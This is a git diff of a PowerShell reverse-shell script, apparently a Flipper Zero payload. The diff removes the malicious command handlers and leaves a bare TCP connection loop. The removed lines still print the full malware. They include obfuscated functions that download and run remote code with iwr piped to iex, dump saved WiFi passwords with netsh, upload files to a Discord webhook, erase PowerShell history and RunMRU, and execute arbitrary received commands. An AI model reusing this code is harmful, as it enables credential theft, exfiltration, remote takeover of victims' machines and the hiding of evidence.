@@ -5,70 +5,68 @@ param (
 )
 
 # Create TCP client connection and streams
-$client = New-Object Net.Sockets.TCPClient($ip, $port)
+$client = New-Object Net.Sockets.TCPClient
+$client.Connect($ip, $port)
+
+if (-not $client.Connected) {
+    Write-Error "Could not connect to $ip:$port"
+    exit
+}
+
 $stream = $client.GetStream()
+if ($null -eq $stream) {
+    Write-Error "Could not get network stream."
+    $client.Close()
+    exit
+}
+
 $writer = New-Object IO.StreamWriter($stream)
+if ($null -eq $writer) {
+    Write-Error "Could not create stream writer."
+    $stream.Close()
+    $client.Close()
+    exit
+}
 
 function SendToStream($msg) {
-    $writer.Write($msg + 'ffff> ')
-    $writer.Flush()
-}
-
-function hasbullawjwindbw {
-    (iwr 'https://google.com@raw.githubusercontent.com/CharlesTheGreat77/token2Discord/main/Testing.txt').Content | iex
-}
-
-function popopwhwhbsvxjnfiifb {
-    $PsandQs = netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''}
-    SendToStream "OUTPUT: $PsandQs"
-}
-
-function flipejsjiebsbllb($ibwjskwbnskieg) {
-    $body = @{ content = $ibwjskwbnskieg } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
-}
-
-function kwhhabzbabjeikfn {
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -ErrorAction SilentlyContinue
+    if ($null -ne $writer) {
+        $writer.Write($msg + 'ffff> ')
+        $writer.Flush()
+    }
 }
 
 SendToStream "Connected to $ip on port $port"
 
-$buffer = New-Object byte[] $client.ReceiveBufferSize
-$read = 1
+$buffer = New-Object byte[] 4096
 
-while ($read -ge 0) {
-    $read = $stream.Read($buffer, 0, $buffer.Length)
+while ($true) {
+    try {
+        if ($null -eq $stream) { break }
 
-    if ($read -gt 0) {
-        $inputStr = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read - 1)
+        $read = $stream.Read($buffer, 0, $buffer.Length)
 
-        if ($inputStr -match "^/discord\s+(.+)$") {
-            $filename = $matches[1]
-            $msg = "Flipper Report for $env:USERNAME"
-            flipejsjiebsbllb $msg
-            curl.exe -F "file1=@$filename" $webhook
-            SendToStream "File '$filename' sent.."
+        # If no bytes read, remote closed connection
+        if ($read -le 0) {
+            break
         }
-        elseif ($inputStr -match "^/tgrizzly$") {
-            SendToStream "Executing /tgrizzly functionality.. saving output to C:\temp\output.txt"
-            hasbullawjwindbw
-        }
-        elseif ($inputStr -match "^/wifi$") {
-            SendToStream "Executing /wifi.."
-            popopwhwhbsvxjnfiifb
-        }
-        elseif ($inputStr -match "^/clean$") {
-            SendToStream "Executing cleanup.."
-            kwhhabzbabjeikfn
-        }
-        else {
-            $result = try { Invoke-Expression $inputStr 2>&1 | Out-String } catch { $_ | Out-String }
-            SendToStream $result
-        }
+
+        $inputStr = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
+
+        # Process $inputStr as before (commands, etc.)
+        # Example:
+        SendToStream "Received: $inputStr"
+        
+        # Your command handling logic here...
+        # ...
+        
+    }
+    catch {
+        Write-Error "Exception during stream read: $_"
+        break
     }
 }
 
-$writer.Close()
-$client.Close()
+# Cleanup
+if ($writer) { $writer.Close() }
+if ($stream) { $stream.Close() }
+if ($client) { $client.Close() }
